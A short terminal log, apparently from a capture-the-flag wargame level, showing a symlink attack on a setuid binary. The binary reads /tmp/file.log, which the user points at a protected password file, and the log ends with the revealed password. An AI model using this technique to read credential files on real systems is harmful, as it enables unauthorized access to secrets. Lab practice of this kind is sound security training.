```text
leviathan5@leviathan:~$ ls -al
total 36
drwxr-xr-x   2 root        root        4096 Oct 14 09:27 .
drwxr-xr-x 150 root        root        4096 Oct 14 09:29 ..
-rw-r--r--   1 root        root         220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root        root        3851 Oct 14 09:19 .bashrc
-r-sr-x---   1 leviathan6  leviathan5 15144 Oct 14 09:27 leviathan5
-rw-r--r--   1 root        root         807 Mar 31  2024 .profile
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd454, 0 <unfinished ...>
fopen("/tmp/file.log", "r") = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
) = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ln -s /tmp/file.log /etc/leviathan_pass/leviathan6
ln: failed to create symbolic link '/etc/leviathan_pass/leviathan6': File exists
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
ln: failed to create symbolic link '/tmp/file.log': File exists
leviathan5@leviathan:~$ ./leviathan5
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
SZO7HDB88w
leviathan5@leviathan:~$ 
```
